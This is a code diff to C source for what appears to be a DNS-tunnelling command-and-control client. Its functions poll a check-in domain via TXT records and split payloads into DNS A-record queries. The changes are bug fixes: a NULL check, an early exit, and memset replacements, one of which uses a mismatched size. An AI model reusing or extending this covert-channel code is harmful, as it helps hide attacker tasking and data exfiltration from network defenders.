@@ -122,6 +122,7 @@ int send_response(client_t *client, char **data, int data_count) {
         if (resp == NULL) {
             Dprintf("[d] ! response was empty\n");
             err_fail = 1;
+            goto DONE;
         }
 
         if (strstr(resp, resp_failure) != NULL) {
@@ -136,6 +137,7 @@ int send_response(client_t *client, char **data, int data_count) {
         free(resp);
     }
 
+    DONE:
     // let's not leak that arrays memory
     for (int i = 0; i < data_count; i++) {
         free(data[i]);
@@ -150,6 +152,11 @@ int send_response(client_t *client, char **data, int data_count) {
 int poll(client_t *client) {
 
     char *txt = dns_raw_txt_lookup(client->checkin_domain);
+
+    if (txt == NULL) {
+        client->status = Idle;
+        return 1;
+    }
 
     if (strstr(txt, resp_idle) != NULL) {
         free(txt);
@@ -312,11 +319,12 @@ char **payload_to_dns_a(const char *payload, int payload_len, int *requests_len)
 
         // create the actual data requests
 
-        char request[max_label + 1] = {0};
-        char byte_parts[3][data_label_all_max + 1] = {{0x00},
-                                                      {0x00},
-                                                      {0x00}};
-        char byte_full[data_label_all_max] = {0};
+        char request[max_label + 1];
+        memset(request, 0, max_label + 1);
+        char byte_parts[3][data_label_all_max + 1];
+        memset(byte_parts, 0, 3 * data_label_all_max + 1);
+        char byte_full[data_label_all_max];
+        memset(byte_full, 0, data_label_all_max);
         int byte_full_length = 0;
 
         for (int pi = 0; pi < 3; pi++) {
@@ -360,7 +368,8 @@ char **payload_to_dns_a(const char *payload, int payload_len, int *requests_len)
         }
 
         // populate a string with the 3 labels properly formatted
-        char data_parts_str[data_label_all_max_str + 1 + (3)] = {0}; // +3 for .'s
+        char data_parts_str[data_label_all_max_str + 1 + (3)]; // +3 for .'s
+        memset(data_parts_str, 0, data_label_all_max_str + 1 + 3);
         switch (data_parts) {
             case 1:
                 snprintf(data_parts_str, data_label_all_max_str + 4, "%s.0.0", byte_parts[0]);
